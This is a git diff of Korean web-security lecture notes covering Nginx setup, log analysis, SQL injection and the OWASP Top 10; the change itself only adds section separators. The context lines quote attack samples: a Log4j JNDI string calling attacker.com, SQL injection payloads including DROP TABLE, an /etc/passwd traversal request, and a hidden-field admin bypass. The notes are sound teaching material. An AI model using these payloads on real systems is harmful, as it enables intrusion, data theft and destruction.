@@ -1,7 +1,8 @@
----
+
+--- 
 title: "📝 리눅스 시스템 및 웹 보안 강의 노트 (2025-12-18)"
 date: 2025-12-18
-excerpt: "본 강의 노트는 2025년 12월 18일에 진행된 **리눅스 시스템 및 웹 보안** 강의 내용을 극도로 상세하게 정리한 학습 자료입니다. 이 노트를 통해 다음과 같은 역량을 갖출 수 있습니다:"
+excerpt: "본 강의 노트는 2025년 12월 18일에 진행된 리눅스 시스템 및 웹 보안 강의 내용을 극도로 상세하게 정리한 학습 자료입니다. 이 노트를 통해 다음과 같은 역량을 갖출 수 있습니다:"
 categories:
   - App-Security
 tags:
@@ -11,6 +12,7 @@ tags:
 
 # 📝 리눅스 시스템 및 웹 보안 강의 노트 (2025-12-18)
 
+---
 
 ## 📚 학습 목표 및 개요
 
@@ -35,6 +37,7 @@ tags:
 | 5 | OWASP TOP 10 | 10대 웹 애플리케이션 취약점 상세 분석 | 이론 + 사례 |
 | 6 | 종합 정리 | 학습 내용 요약 및 다음 단계 안내 | 복습 |
 
+---
 
 ## 1️⃣ 강의 시작 및 오리엔테이션
 
@@ -91,6 +94,7 @@ tags:
 
 실무에서는 편집기를 능숙하게 다루지 못하면 업무 진행이 불가능합니다. 지금 리눅스 편집기에 익숙해지는 것이 매우 중요합니다.
 
+---
 
 ## 2️⃣ 왜 리눅스를 배워야 하는가? (핵심 철학)
 
@@ -251,6 +255,7 @@ graph LR
 
 > "여러분들이 불편한 거를 감수하고, 여러분들이 편한 게 목적이 아니라 원활한 서비스가 목적이 되는 거죠. 그런 의미에 맞추다 보니까 윈도우라는 운영체제보다 리눅스라는 운영체제가 서비스를 제공하기에는 굉장히 편리한 거거든요."
 
+---
 
 ## 3️⃣ 리눅스 환경에 익숙해지기
 
@@ -371,6 +376,7 @@ graph TD
 
 따라서 보안 과정을 배우는 여러분들은 **불편하더라도 자꾸 익숙해질 수 있게 노력**해야 합니다.
 
+---
 
 ## 4️⃣ 리눅스 학습의 실제 어려움과 극복 방법
 
@@ -513,6 +519,7 @@ graph LR
 
 > "조금 쓰다 보면 사실은 주로 사용하는 명령어가 제가 봤을 때는 한 20개에서 20~30개 안 될 거예요. 한 20~30개 정도면 리눅스 쓰는데 크게 불편하지 않을 거예요."
 
+---
 
 ## 5️⃣ 어제 배운 내용 복습 시작
 
@@ -623,6 +630,7 @@ graph TD
 - 서브넷으로 세부 망 분리
 - 보안 그룹 및 NACL로 접근 제어
 
+---
 
 ## ✅ Section 1 학습 체크리스트
 
@@ -686,6 +694,7 @@ graph TD
 ✅ 단계별 방화벽 설정
 ```
 
+---
 
 ## 🔜 다음 섹션 예고
 
@@ -712,11 +721,13 @@ graph TD
    - 검색, 저장, 종료 단축키
    - 실전 편집 테크닉
 
+---
 
 **강의 노트 작성**: Section 1 완료 ✅
 **다음 단계**: Section 2 작성 진행 예정
 # Section 2: Nginx 설정 파일 Deep Dive 및 보안 개념
 
+---
 
 ## 📋 학습 목표
 
@@ -729,6 +740,7 @@ graph TD
 5. **로그 파일 관리**: 에러 로그 및 액세스 로그 위치
 6. **설정 파일 분할**: include 구문을 통한 모듈화
 
+---
 
 ## 1️⃣ Nginx 프로세스 구조 이해
 
@@ -819,6 +831,7 @@ worker_processes 10;
 
 > "소로공이 싸울 때, 여러 명의 적들하고 싸울 때 자기의 분신술을 써서 나루토가 그랬지, 나루토가 여러 개를 분신하는 거랑 동일해요."
 
+---
 
 ## 2️⃣ 보안 권한 설정: www-data 사용자
 
@@ -922,6 +935,7 @@ $ sudo apt install nginx
 # 3. /var/www 디렉토리 생성 및 권한 설정
 ```
 
+---
 
 ## 3️⃣ Nginx 설정 파일 상세 분석
 
@@ -1030,6 +1044,7 @@ events {
 예: 2 × 768 = 1536 연결
 ```
 
+---
 
 ### 📁 MIME Types 설정
 
@@ -1139,6 +1154,7 @@ application/haansofthwp                 hwp;
 $ sudo systemctl restart nginx
 ```
 
+---
 
 ### 🔐 MIME Type과 업로드 취약점
 
@@ -1240,6 +1256,7 @@ location /uploads {
 }
 ```
 
+---
 
 ## 4️⃣ 리눅스 파일 확장자의 진실
 
@@ -1395,6 +1412,7 @@ done
 
 확장자가 `.jpg`이지만 실제로는 **PHP 스크립트**입니다. 이는 명백한 웹셸 업로드 시도입니다!
 
+---
 
 ## 5️⃣ SSL/TLS 설정
 
@@ -1447,6 +1465,7 @@ graph TD
 
 > "지금 우리가 서비스하는 건 뭐예요? 서버죠. TLS 버전 1.2를 지원하는 브라우저를 사용하고 있으면 우리가 1.3을 썼을 때 서비스를 제대로 못 하게 되겠죠, 그렇죠? 그렇기 때문에 이렇게 여러 가지 버전을 쭉, 이런 버전들을 호환한다라고 쓰는 거예요."
 
+---
 
 ## 6️⃣ 액세스 로그 (Access Log)
 
@@ -1510,6 +1529,7 @@ $ sudo tail -f /var/log/nginx/access.log
 | 상태 코드 | 200 | 응답 상태 (200 = 성공) |
 | 크기 | 612 | 응답 데이터 크기 (바이트) |
 
+---
 
 ## 7️⃣ gzip 압축 설정
 
@@ -1559,6 +1579,7 @@ Content-Encoding: gzip
 Content-Length: 20480
 ```
 
+---
 
 ## 8️⃣ Include 구문과 설정 파일 분할
 
@@ -1637,6 +1658,7 @@ $ tree /etc/nginx/
     └── default                 # 기본 가상 호스트 설정
 ```
 
+---
 
 ## 9️⃣ 가상 호스트 (Virtual Hosting)
 
@@ -1832,6 +1854,7 @@ $ sudo vi /etc/hosts
 192.168.1.100  www.daum.net daum.net
 ```
 
+---
 
 ## 🔟 apt vs apt-get
 
@@ -1867,6 +1890,7 @@ apt (바이너리)
 
 > "여러분들은 굳이 구분할 필요는 없어요. 그냥 apt 아니면 apt-get 둘 다 똑같으니까 둘 중에 하나 쓰면 된다고 생각하시면 될 거예요."
 
+---
 
 ## 1️⃣1️⃣ 에러 및 Warning 메시지 해석
 
@@ -1936,6 +1960,7 @@ $ sudo systemctl daemon-reload
 
 > "에러 메시지는 나한테 굉장히 친절한 메시지니까 눈여겨서 봐라."
 
+---
 
 ## ✅ Section 2 학습 체크리스트
 
@@ -2001,6 +2026,7 @@ www-data 사용자 = 최소 권한 원칙
 → 읽고 해결 방법 찾기
 ```
 
+---
 
 ## 🔜 다음 섹션 예고
 
@@ -2027,11 +2053,13 @@ www-data 사용자 = 최소 권한 원칙
    - 공격 시간대 특정
    - 차단할 IP 리스트 작성
 
+---
 
 **강의 노트 작성**: Section 2 완료 ✅
 **다음 단계**: Section 3 작성 진행 예정
 # Section 3: 웹 로그 분석 및 공격 탐지
 
+---
 
 ## 📋 학습 목표
 
@@ -2043,6 +2071,7 @@ www-data 사용자 = 최소 권한 원칙
 4. **브루트 포스 공격 탐지**: 로그를 통한 공격 탐지 방법
 5. **실무 로그 분석 시나리오**: 실제 공격 사례 분석
 
+---
 
 ## 1️⃣ systemctl과 프로세스 관리 심화
 
@@ -2137,6 +2166,7 @@ sequenceDiagram
 
 > "리스타트는 죽였다가 다시 띄우는 거고요. 릴로드 옵션은 그냥 컨피그만 다시 읽는 거라 서비스에 끊김은 없거든요."
 
+---
 
 ## 2️⃣ 액세스 로그 구조 분석
 
@@ -2268,6 +2298,7 @@ graph LR
 
 > "로그인 페이지가 떴고 로그인.jsp로 포스트가 날라갔고 그 다음에 index.html로 넘어갔어요. 그러면 우리는 이 로그를 보고 뭐라고 할 수 있어요? 로그인에 성공했구나라는 걸 알 수 있겠죠. 근데 이 위에 요걸 보면 뭘 할 수 있어요? 로그인을 불렀고 로그인.jsp가 떴고 그 다음에 또 로그인.html 떴어. 얘는 뭐예요? 아 로그인에 실패했구나 포스트로 날라간 데이터가 틀려서 다시 로그인 페이지가 떴구나라는 걸 알 수 있어요."
 
+---
 
 ## 3️⃣ 브루트 포스 공격 탐지
 
@@ -2409,6 +2440,7 @@ grep "POST.*login.jsp" access.log   # POST 로그인 요청만 추출
 | sort -rn                           # 개수 역순 정렬
 ```
 
+---
 
 ## 4️⃣ 실무 공격 탐지 시나리오
 
@@ -2531,6 +2563,7 @@ maxretry = 5  # 5회 실패 시 차단
 bantime = 3600  # 1시간 차단
 ```
 
+---
 
 ## 5️⃣ 실무 팁 및 베스트 프랙티스
 
@@ -2614,6 +2647,7 @@ tail -f /var/log/nginx/access.log | while read line; do
 done
 ```
 
+---
 
 ## ✅ Section 3 학습 체크리스트
 
@@ -2670,6 +2704,7 @@ awk '{print $1}' | sort | uniq -c        # IP별 집계
 grep "18/Dec/2025:10:30:" access.log     # 시간대별
 ```
 
+---
 
 ## 🔜 다음 섹션 예고
 
@@ -2683,10 +2718,12 @@ grep "18/Dec/2025:10:30:" access.log     # 시간대별
 4. OR '1'='1' 공격 원리
 5. 방어 기법 (Prepared Statement 등)
 
+---
 
 **강의 노트 작성**: Section 3 완료 ✅
 # Section 4: SQL 인젝션 및 데이터베이스 보안
 
+---
 
 ## 📋 학습 목표
 
@@ -2696,6 +2733,7 @@ grep "18/Dec/2025:10:30:" access.log     # 시간대별
 4. 클라이언트 사이드 검증의 한계
 5. 버프스위트를 이용한 요청 변조
 
+---
 
 ## 1️⃣ 데이터베이스 설정 및 계정 생성
 
@@ -2768,6 +2806,7 @@ Enter password: 1234
 
 ✅ **접속 성공 확인**
 
+---
 
 ## 2️⃣ 데이터베이스 및 테이블 생성
 
@@ -2870,6 +2909,7 @@ Empty set (0.00 sec)
 
 ❌ **로그인 실패** (데이터 0개 반환)
 
+---
 
 ## 3️⃣ JSP 로그인 페이지 구현
 
@@ -2943,6 +2983,7 @@ Empty set (0.00 sec)
 </html>
 ```
 
+---
 
 ## 4️⃣ SQL 인젝션 공격 원리
 
@@ -3003,6 +3044,7 @@ graph TD
 | `' UNION SELECT ...` | 다른 테이블 데이터 조회 |
 | `'; DROP TABLE USER_INFO--` | 테이블 삭제 (매우 위험!) |
 
+---
 
 ## 5️⃣ 클라이언트 사이드 검증의 한계
 
@@ -3087,6 +3129,7 @@ username=admin&password=1234
 
 💡 **교훈**: **클라이언트 사이드 검증은 보안이 아닙니다!**
 
+---
 
 ## 6️⃣ 방어 기법
 
@@ -3135,6 +3178,7 @@ GRANT SELECT, INSERT, UPDATE ON CLOUD_DB.* TO 'webapp'@'%';
 -- DROP, ALTER 등 위험한 권한은 제외
 ```
 
+---
 
 ## ✅ Section 4 핵심 요약
 
@@ -3162,10 +3206,12 @@ GRANT SELECT, INSERT, UPDATE ON CLOUD_DB.* TO 'webapp'@'%';
 4. 최소 권한 DB 계정
 ```
 
+---
 
 **Section 4 완료** ✅
 # Section 5: OWASP TOP 10 및 웹 공격 방법론
 
+---
 
 ## 📋 학습 목표
 
@@ -3176,6 +3222,7 @@ GRANT SELECT, INSERT, UPDATE ON CLOUD_DB.* TO 'webapp'@'%';
 5. Google Hacking 기법
 6. **OWASP TOP 10 취약점 완벽 분석**
 
+---
 
 ## 1️⃣ 네트워크 구성과 공격 경로
 
@@ -3278,6 +3325,7 @@ iptables -A FORWARD -j DROP
 
 💡 **핵심**: 웹 서버가 해킹당해도 내부 네트워크는 **별도 방화벽으로 보호**
 
+---
 
 ## 2️⃣ 해킹 공격 단계 (Kill Chain)
 
@@ -3366,6 +3414,7 @@ userInput = "${jndi:ldap://attacker.com/evil}"
 3. **시간 조작**: 포렌식 분석 방해
 4. **데이터 탈취**: 압축 후 외부 전송
 
+---
 
 ## 3️⃣ 백업 파일 취약점
 
@@ -3452,6 +3501,7 @@ location ~* \.(bak|old|backup|swp|~)$ {
 }
 ```
 
+---
 
 ## 4️⃣ Burp Suite를 이용한 정보 수집
 
@@ -3512,6 +3562,7 @@ hanbit.co.kr
 - ✅ 수동 탐색 시 자동 매핑
 - ✅ 요청/응답 가로채기 및 변조
 
+---
 
 ## 5️⃣ F12 개발자 도구 활용
 
@@ -3596,6 +3647,7 @@ document.querySelector('input[name="isAdmin"]').value = '1';
 // 폼 제출 → 관리자 권한으로 로그인 시도
 ```
 
+---
 
 ## 6️⃣ Google Hacking 기법
 
@@ -3678,6 +3730,7 @@ filetype:pptx
 - **Web Server Detection**: 서버 정보 탐지
 - **Vulnerable Files**: 취약한 파일
 
+---
 
 ## 7️⃣ Nikto - 웹 취약점 스캐너
 
@@ -3750,6 +3803,7 @@ GET /%c1%1c%c1%1c%c1%1c/etc/passwd HTTP/1.1
 - 실제 데이터 탈취 시도
 ```
 
+---
 
 ## 8️⃣ OWASP TOP 10 (2017/2021)
 
@@ -3792,6 +3846,7 @@ graph LR
 
 ### 🔟 OWASP TOP 10 (2021년 기준)
 
+---
 
 #### **A01:2021 - 접근 통제 실패 (Broken Access Control)**
 
@@ -3837,6 +3892,7 @@ https://example.com/admin/bbs/notice/
 
 **탐지율**: 전체 애플리케이션의 3.81%에서 발견
 
+---
 
 #### **A02:2021 - 암호화 실패 (Cryptographic Failures)**
 
@@ -3872,6 +3928,7 @@ String dbPass = "1234";  ← 평문 노출!
 - HTTPS 강제 사용 (HTTP → HTTPS 리다이렉트)
 - DB 컬럼 레벨 암호화 (AES-256)
 
+---
 
 #### **A03:2021 - 인젝션 (Injection)**
 
@@ -3913,6 +3970,7 @@ pstmt.setString(1, userId);
 pstmt.setString(2, userPw);
 ```
 
+---
 
 #### **A04:2021 - 안전하지 않은 설계 (Insecure Design)**
 
@@ -3945,6 +4003,7 @@ pstmt.setString(2, userPw);
 - **최소 권한 원칙** 적용
 - **Secure by Default** (기본값을 안전하게)
 
+---
 
 #### **A05:2021 - 보안 설정 오류 (Security Misconfiguration)**
 
@@ -3992,6 +4051,7 @@ Options -Indexes
 ?>
 ```
 
+---
 
 #### **A06:2021 - 취약하고 오래된 구성요소 (Vulnerable and Outdated Components)**
 
@@ -4041,6 +4101,7 @@ DBMS 비교:
 - MySQL: 무료 → 문제 시 자체 책임
 ```
 
+---
 
 #### **A07:2021 - 식별 및 인증 실패 (Identification and Authentication Failures)**
 
@@ -4083,6 +4144,7 @@ session.invalidate();
 session = request.getSession(true);  // 새 세션 생성
 ```
 
+---
 
 #### **A08:2021 - 소프트웨어 및 데이터 무결성 실패 (Software and Data Integrity Failures)**
 
@@ -4116,6 +4178,7 @@ $ sha256sum package.tar.gz
 abc123def456...  (예상 값과 비교)
 ```
 
+---
 
 #### **A09:2021 - 보안 로깅 및 모니터링 부족 (Security Logging and Monitoring Failures)**
 
@@ -4159,6 +4222,7 @@ $ date -s "2020-01-01 00:00:00"
 - **로그 파일 쓰기 전용** 권한 설정
 - **실시간 모니터링** (SIEM 도구)
 
+---
 
 #### **A10:2021 - 서버 측 요청 위조 (Server-Side Request Forgery, SSRF)**
 
@@ -4205,6 +4269,7 @@ if (!Arrays.asList(allowedHosts).contains(url.getHost())) {
 }
 ```
 
+---
 
 ## ✅ Section 5 핵심 요약
 
@@ -4255,12 +4320,14 @@ DMZ (웹 서버) → 방화벽 → 내부 (WAS) → DB
 5. 출력 인코딩 (Output Encoding)
 ```
 
+---
 
 **Section 5 완료** ✅
 
 **다음**: Section 6에서 전체 내용 종합 정리 및 학습 로드맵 제시
 # Section 6: 종합 정리 및 학습 로드맵
 
+---
 
 ## 📚 전체 강의 요약
 
@@ -4293,6 +4360,7 @@ DMZ (웹 서버) → 방화벽 → 내부 (WAS) → DB
 - 공격 단계별 대응 전략
 - 정보 수집 기법 및 방어
 
+---
 
 ## 🗺️ 섹션별 핵심 내용 복습
 
@@ -4313,6 +4381,7 @@ DMZ (웹 서버) → 방화벽 → 내부 (WAS) → DB
 $ history | tail -10  # 오늘 사용한 명령어 복습
 ```
 
+---
 
 ### Section 2: Nginx 및 시스템 관리
 
@@ -4348,6 +4417,7 @@ add_header X-Content-Type-Options "nosniff";
 add_header X-XSS-Protection "1; mode=block";
 ```
 
+---
 
 ### Section 3: 웹 로그 분석
 
@@ -4390,6 +4460,7 @@ findtime = 600
 bantime = 3600
 ```
 
+---
 
 ### Section 4: SQL 인젝션
 
@@ -4423,6 +4494,7 @@ JavaScript 검증 → Burp Suite로 우회 가능
 ⚠️ 교훈: 서버에서 반드시 재검증!
 ```
 
+---
 
 ### Section 5: OWASP TOP 10
 
@@ -4460,6 +4532,7 @@ OWASP TOP 3 (가장 위험):
 → 프로젝트에서 이 3가지는 반드시 방어!
 ```
 
+---
 
 ## 🎓 학습 로드맵
 
@@ -4509,6 +4582,7 @@ $ crontab -e
 - 각 취약점별 예제 코드 작성
 - CTF 문제 1개 풀기
 
+---
 
 ### 📈 중기 목표 (1개월)
 
@@ -4557,6 +4631,7 @@ msf6 > use exploit/multi/http/log4j_rce
 4. 공격 데모 영상 스토리보드
 ```
 
+---
 
 ### 🚀 장기 목표 (3개월)
 
@@ -4590,6 +4665,7 @@ $ vi port_scanner.py
 5. 보안 관제 시뮬레이터
 ```
 
+---
 
 ## 🛠️ 실전 스킬 체크리스트
 
@@ -4643,6 +4719,7 @@ $ vi port_scanner.py
 - [ ] OWASP ZAP 활용
 - [ ] John the Ripper (패스워드 크래킹)
 
+---
 
 ## 📖 추천 학습 자료
 
@@ -4695,6 +4772,7 @@ $ vi port_scanner.py
 - Facebook CTF
 ```
 
+---
 
 ## 💡 강사의 조언
 
@@ -4736,6 +4814,7 @@ $ git remote add origin https://github.com/yourusername/security-portfolio.git
 $ git push -u origin main
 ```
 
+---
 
 ### 🚨 주의사항
 
@@ -4776,6 +4855,7 @@ $ git push -u origin main
 - 발견한 취약점 악용
 ```
 
+---
 
 ## 🎉 마무리 및 격려
 
@@ -4813,6 +4893,7 @@ $ cd ~/owasp-study
 $ touch A01_broken_access_control.md
 ```
 
+---
 
 ## 🔗 다음 단계
 
@@ -4843,6 +4924,7 @@ graph TD
 | 보안 관제 | 로그 분석, SIEM, 포렌식 | 정보보안기사, GCIH |
 | DevSecOps | Docker, Kubernetes, CI/CD | CKS, GIAC |
 
+---
 
 ## ✅ 최종 점검 사항
 
@@ -4877,6 +4959,7 @@ graph TD
 → ✅ **수료를 축하합니다!**
 → ❌ **복습이 필요한 섹션으로 돌아가세요**
 
+---
 
 ## 🙏 마지막 인사
 
@@ -4897,6 +4980,7 @@ $ echo "You can do it!" >> /etc/motd
 $ reboot  # 새로운 시작!
 ```
 
+---
 
 **강의 노트 끝** 📚
 
